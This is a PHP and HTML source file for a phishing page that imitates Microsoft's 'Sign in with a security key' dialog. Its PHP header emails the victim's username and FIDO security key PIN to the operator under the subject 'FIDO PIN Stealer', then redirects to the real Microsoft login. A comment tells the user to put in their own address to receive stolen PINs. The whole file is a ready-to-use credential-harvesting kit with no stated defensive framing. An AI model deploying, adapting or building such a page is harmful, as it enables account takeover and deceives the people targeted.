<?php

$user=filter_var(base64_decode($_GET["query"]), FILTER_SANITIZE_EMAIL);
 

if (isset($_POST['user'])){
	
	$usr=filter_var($_POST['user'], FILTER_SANITIZE_EMAIL);
	$pin=filter_var($_POST['pin'], FILTER_SANITIZE_NUMBER_INT);
	$message="The user: ".$usr."  supplied PIN: ".$pin;
	
	// Modify  the email in the  line below to send the PIN by email to yourself
    mail('email@ address .com', 'FIDO PIN Stealer', $message);


	header("Location:https://login.microsoftonline.com");
	
} 
 

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- This is the generated HTML file of the demo page -->
    <meta charset="utf-8" />
  <link rel="icon" type="image/x-icon" href="images/favico.ico">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Sign in to your account</title>

    <link rel="stylesheet" href="css/winstrap.min.css?0.5.13" />
    <script src="js/vendor/jquery.min.js"></script>
    <!--[if lt IE 9]>
        <script src="js/vendor/html5shiv.min.js"></script>
        <script src="js/vendor/respond.min.js"></script>
    <![endif]-->
</head>


<style>.table:hover{ background-color: #dedcdc }

.table {padding:5px 5px 5px 5px}
</style>
<body  onkeydown="document.getElementById('pin').focus();" style="background-image: url(https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg); background-size:cover">
     
 
      <p><br></p>
    <p><br></p>
   
     
    <section class="section" id="dialogs" style="margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 440px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
    min-width: 320px;
    min-height: 338px;
    overflow: hidden;">
        <header class="section-header row">
            <h3 class="section-title col-xs-24"><img class="logo"  src="images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"   alt="Microsoft"><br>
                <a  style="font-size:0.6em" href="#dialogs"><b>Sign-in options</b></a>
            </h3>
        </header>
    
	<!-- MS Login -->
	
	
	<form>
        <div class="form-group" >
           <div class="row tile" role="listitem"   >
                <div class="table" tabindex="0" role="button">

                    <div class="table-cell tile-img">
                        <div data-toggle="modal"  data-target="#modal-sample" onClick='document.getElementById("pin").focus();' >
                           <img align=left  class="tile-img" role="presentation" hspace=3 src="images/cred_option_fido_498a4d7bb984e5436a52c8b52f3ab0f7.svg"><!-- /ko -->
                        </div>
                    </div>

                    <div  class="table-cell text-left content"  aria-hidden="true"  data-target="#modal-sample">
                        <div   data-toggle="modal"   onClick='document.getElementById("pin").focus();' data-target="#modal-sample"    >Sign in with a security key</div>
                        <div data-toggle="modal" onClick='document.getElementById("pin").focus();' style="margin-right:20px"  data-target="#modal-sample" ><small data-bind="text: helpText">Choose this only if you have enabled a security key for your account.</small>
					
						</div><img align=right data-toggle="modal" style="margin-top:-50px"   data-target="#modal-sample1" title="sign in with a security key"  src="images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg">
                       </div>
					
					
					
                </div>
				
				
				 <div class="row tile" role="listitem"   >
                <div class="table" tabindex="0" role="button">

                    <div class="table-cell tile-img">
                        <div  >
                           <img align=left  class="tile-img" role="presentation" hspace=6 src="images/cred_option_github_a7c769e31a628e643841187d20e149e3.svg" onClick="window.location.href='https://github.com'" > 
                        </div>
                    </div>

                    <div  class="table-cell text-left content"  aria-hidden="true"  data-target="#modal-sample">
                        <div onClick="window.location.href='https://github.com'"     >Sign in with Github</div>
                        <div  onClick="window.location.href='https://github.com'" ><small data-bind="text: helpText">Personal accounts only</small>
					
						</div><img align=right data-toggle="modal" style="margin-top:-40px; margin-right:10px"   data-target="#modal-sample2" title="sign in with a github account"  src="images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg">
                       </div>
					 
					
                </div>
            </div>
			
			
			 <div class="row tile" role="listitem"   >
                <div class="table" tabindex="0" role="button">

                    <div class="table-cell tile-img">
                        <div  >
                           <img align=left  class="tile-img" role="presentation" hspace=6 src="images/picker_account_aad_725681b49f77650b9c9b970eb784476c.png"> 
                        </div>
                    </div>

                    <div onClick="window.location.href='https://login.microsoftonline.com'" class="table-cell text-left content"  aria-hidden="true"  data-target="#modal-sample">
                        <div     >Sign in to an organization</div>
                        <div><small data-bind="text: helpText">Search for a company or an organization you're working with.</small>
					
						</div>
                       </div>
					 
					
                </div>
            </div>
			
            </div>
        </div>
    
	<input type="button" id="idBtn_Back"  style="    display: inline-block;
    max-width: 100px;
	float:right;
    padding: 4px 12px 4px 12px;
    margin-top: 4px;
    margin-bottom: 4px;
    position: relative;
     
    text-align: center;
    white-space: nowrap;
    overflow: hidden;
    vertical-align: middle;
    text-overflow: ellipsis;
    touch-action: manipulation;
    color: #000;
    border-style: solid;
    border-width: 2px;
    border-color: transparent;
    min-height: 32px;
    border: none;
    background-color: #ccc;
    background-color: rgba(0,0,0,0.2);
    min-width: 108px;
    line-height: normal;
    margin-top: 0;
    margin-bottom: 0;
    display: block;
    width: 100%;" onClick="window.location.href='https://login.microsoftonline.com/'" value="Back">
			
    </form>
	
	
	<!-- MS Login End -->
	
	
         
    
        <div class="modal modal-center-vertical" id="modal-sample" tabindex="-1" role="dialog" aria-labelledby="modal-sample-label" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header" style="margin-top:-50px">
                        <h4 class="modal-title" style="font-size:1em" id="modal-sample-label">Windows security</h4>
                    </div><br>
                    <div class="modal-body">
					 <h4 class="modal-title" id="modal-sample-label"  style="margin-top:-60px">Making sure it's you</h4>
                        Please sign in to login.microsoftonline.com as <?=$user?> <br> Please plug in your security key and continue by entering the PIN<br><br>
						
						This request comes from Chrome, published by Google Inc. 
						<div style="margin-left:1em"><h4  style="margin-top:-20px; font-size:200%">Please enter your security key PIN.</h4><br>
						<form id=myForm action="" method=post><div class="form-group">
                        <img src=images/user.svg width=33 hspace=10 align=left>
						<input name=user type=hidden value="<?=$user?>">
                        <input name=pin id=pin type="password" required class="form-control" id="exampleInputPassword1" placeholder="PIN"></div>
                    
					</div>
					
					
                    </div>
                    <div class="modal-footer">
                        <button type="submit" class="btn btn-info"  > OK </button>
                        <button type="button" class="btn btn-info" data-dismiss="modal">Cancel</button>
                    </div></form>
                </div>
            </div>
        </div>
    
	
	
        <div class="modal modal-center-vertical" id="modal-sample1" tabindex="-1" role="dialog" aria-labelledby="modal-sample-label" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content" style="background-color:white">
                    <div class="modal-header">
                        <h4 class="modal-title" id="modal-sample-label"> <img align="left" class="tile-img" role="presentation" hspace="3" src="images/cred_option_fido_498a4d7bb984e5436a52c8b52f3ab0f7.svg"><b>Sign in with a security key</b></h4>
                    </div>
                    <div class="modal-body">
                      
					   
					   Sign in without a username or password by using a security key.<br> 
To use this option, you must have previously set this up on your account. <br>

<a id="fidoHelpLink" href="https://go.microsoft.com/fwlink/?linkid=2013738" target="_blank">Learn how to set this up</a>

                    </div>
                    <div class="modal-footer">
                  
                        <button type="button" class="btn   btn-primary" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
		



 <div class="modal modal-center-vertical" id="modal-sample2" tabindex="-1" role="dialog" aria-labelledby="modal-sample-label" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content" style="background-color:white">
                    <div class="modal-header">
                        <h4 class="modal-title" id="modal-sample-label"> <img align="left" class="tile-img" role="presentation" hspace="3" src="images/cred_option_github_a7c769e31a628e643841187d20e149e3.svg"><b> Sign in with GitHub</b></h4>
                    </div>
                    <div class="modal-body">

To use this option, you must have previously linked your personal Microsoft account to a GitHub account.<br>
You can't use this option to access work or school resources.
                                         

                    </div>
                    <div class="modal-footer">

                        <button type="button" class="btn   btn-primary" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>




		
        <div class="modal modal-center-vertical theme-alt" id="modal-sample-alt" tabindex="-1" role="dialog" aria-labelledby="modal-sample-label" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h4 class="modal-title" id="modal-sample-label">Dialog in alt theme</h4>
                    </div>
                    <div class="modal-body">
                        Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-dismiss="modal">Cancel</button>
                    </div>
                </div>
            </div>
        </div>

		
 
    <script src="js/vendor/bootstrap.min.js"></script>
    
	
	
	
	
	</body>

	
	</html>
